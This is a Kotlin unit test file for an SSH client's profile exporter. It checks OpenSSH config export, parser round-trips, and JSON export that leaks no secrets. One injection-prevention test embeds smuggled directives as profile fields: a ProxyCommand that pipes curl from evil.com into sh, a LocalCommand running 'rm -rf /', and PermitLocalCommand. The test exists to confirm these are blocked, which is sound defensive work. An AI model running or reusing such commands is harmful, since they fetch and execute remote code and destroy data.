package com.adamoutler.ssh.network

import com.adamoutler.ssh.data.AuthType
import com.adamoutler.ssh.data.ConnectionProfile
import com.adamoutler.ssh.data.Protocol
import com.adamoutler.ssh.openssh.OpenSshConfigParser
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.ByteArrayInputStream
import java.util.UUID

class PortableProfileExporterTest {

    @Test
    fun testExportToOpenSshConfigAndRoundTripWithParser() {
        val bastion = ConnectionProfile(
            id = "bastion_uuid",
            nickname = "bastion-gateway",
            host = "bastion.infra.net",
            port = 2222,
            username = "jumpadmin",
            protocol = Protocol.SSH,
        )

        val appServer = ConnectionProfile(
            id = "app_uuid",
            nickname = "internal-app-server",
            host = "10.10.1.5",
            port = 22,
            username = "appuser",
            protocol = Protocol.SSH,
            keepAliveIntervalSeconds = 45,
            jumpHostProfileId = bastion.id,
        )

        val telnetSwitch = ConnectionProfile(
            id = "telnet_uuid",
            nickname = "core-router",
            host = "10.0.0.1",
            port = 23,
            protocol = Protocol.TELNET,
        )

        val configText = PortableProfileExporter.exportToOpenSshConfig(
            listOf(bastion, appServer, telnetSwitch),
        )

        // Verify Telnet profile is excluded
        assertFalse(configText.contains("core-router"))

        // Verify OpenSSH directives
        assertTrue(configText.contains("Host bastion-gateway"))
        assertTrue(configText.contains("HostName bastion.infra.net"))
        assertTrue(configText.contains("User jumpadmin"))
        assertTrue(configText.contains("Port 2222"))

        assertTrue(configText.contains("Host internal-app-server"))
        assertTrue(configText.contains("HostName 10.10.1.5"))
        assertTrue(configText.contains("User appuser"))
        assertTrue(configText.contains("ServerAliveInterval 45"))
        assertTrue(configText.contains("ProxyJump bastion-gateway"))

        // Round-trip verification through OpenSshConfigParser
        val parseResult = OpenSshConfigParser.parse(
            ByteArrayInputStream(configText.toByteArray(Charsets.UTF_8)),
        )

        assertEquals(2, parseResult.profiles.size)

        val parsedBastion = parseResult.profiles.find { it.nickname == "bastion-gateway" }
        assertNotNull(parsedBastion)
        assertEquals("bastion.infra.net", parsedBastion?.host)
        assertEquals(2222, parsedBastion?.port)
        assertEquals("jumpadmin", parsedBastion?.username)

        val parsedApp = parseResult.profiles.find { it.nickname == "internal-app-server" }
        assertNotNull(parsedApp)
        assertEquals("10.10.1.5", parsedApp?.host)
        assertEquals(22, parsedApp?.port)
        assertEquals("appuser", parsedApp?.username)
        assertEquals(45, parsedApp?.keepAliveIntervalSeconds)
        assertEquals(parsedBastion?.id, parsedApp?.jumpHostProfileId)
    }

    @Test
    fun testDirectiveInjectionPrevention() {
        val maliciousProfile = ConnectionProfile(
            id = UUID.randomUUID().toString(),
            nickname = "malicious\nProxyCommand curl http://evil.com | sh\nHost dummy",
            host = "10.0.0.1\nLocalCommand rm -rf /",
            username = "root\nPermitLocalCommand yes",
            protocol = Protocol.SSH,
        )

        val configText = PortableProfileExporter.exportToOpenSshConfig(listOf(maliciousProfile))

        // Ensure no raw newlines within directive values
        val lines = configText.lines()
        for (line in lines) {
            val trimmed = line.trim()
            if (trimmed.isEmpty()) continue
            assertFalse(
                "Directives must not inject rogue commands",
                trimmed.startsWith("ProxyCommand", ignoreCase = true) ||
                    trimmed.startsWith("LocalCommand", ignoreCase = true) ||
                    trimmed.startsWith("PermitLocalCommand", ignoreCase = true),
            )
        }

        // Parse with OpenSshConfigParser to confirm no security warnings or injections
        val parseResult = OpenSshConfigParser.parse(
            ByteArrayInputStream(configText.toByteArray(Charsets.UTF_8)),
        )

        assertEquals(1, parseResult.profiles.size)
        assertTrue(parseResult.sanitizedDirectives.isEmpty())
    }

    @Test
    fun testSanitizedJsonExportZeroSecretLeakage() {
        val sensitiveProfile = ConnectionProfile(
            id = "secret_profile_uuid",
            nickname = "Production DB Cluster",
            host = "db.internal.corp",
            port = 5432,
            username = "superadmin",
            protocol = Protocol.SSH,
            authType = AuthType.PASSWORD,
            password = "SuperSecretPassword123!".toByteArray(Charsets.UTF_8),
            sshKeyPasswordReferenceId = "keystore_ref_abc",
            identityId = "identity_private_key_uuid",
            folderId = "Database Tier",
            keepAliveIntervalSeconds = 30,
        )

        val json = PortableProfileExporter.exportToSanitizedJson(listOf(sensitiveProfile))

        // Confirm metadata is present
        assertTrue(json.contains("\"nickname\": \"Production DB Cluster\""))
        assertTrue(json.contains("\"host\": \"db.internal.corp\""))
        assertTrue(json.contains("\"port\": 5432"))
        assertTrue(json.contains("\"username\": \"superadmin\""))
        assertTrue(json.contains("\"protocol\": \"SSH\""))
        assertTrue(json.contains("\"authType\": \"PASSWORD\""))
        assertTrue(json.contains("\"groupId\": \"Database Tier\""))
        assertTrue(json.contains("\"useMosh\": false"))
        assertTrue(json.contains("\"keepAliveIntervalSeconds\": 30"))

        // Absolute guarantee: Zero secret leakages
        assertFalse("Passwords must never be exported", json.contains("SuperSecretPassword123!"))
        assertFalse("Password key must not be serialized", json.contains("\"password\""))
        assertFalse("Keystore reference IDs must not be exported", json.contains("keystore_ref_abc"))
        assertFalse("Identity IDs referencing private keys must not be exported", json.contains("identity_private_key_uuid"))
        assertFalse("Private key text must not exist", json.contains("privateKey"))

        // Verify round-trip import from sanitized JSON
        val imported = PortableProfileExporter.importFromSanitizedJson(json)
        assertEquals(1, imported.size)
        val profile = imported.first()
        assertEquals("Production DB Cluster", profile.nickname)
        assertEquals("db.internal.corp", profile.host)
        assertEquals(5432, profile.port)
        assertEquals("superadmin", profile.username)
        assertEquals(Protocol.SSH, profile.protocol)
        assertEquals(AuthType.PASSWORD, profile.authType)
        assertEquals("Database Tier", profile.folderId)
        assertEquals(30, profile.keepAliveIntervalSeconds)
        assertEquals(null, profile.password)
    }

    @Test
    fun testEmptyProfileListHandling() {
        val config = PortableProfileExporter.exportToOpenSshConfig(emptyList())
        assertEquals("", config)

        val json = PortableProfileExporter.exportToSanitizedJson(emptyList())
        assertEquals("[]", json.trim())

        val imported = PortableProfileExporter.importFromSanitizedJson("[]")
        assertTrue(imported.isEmpty())
    }
}
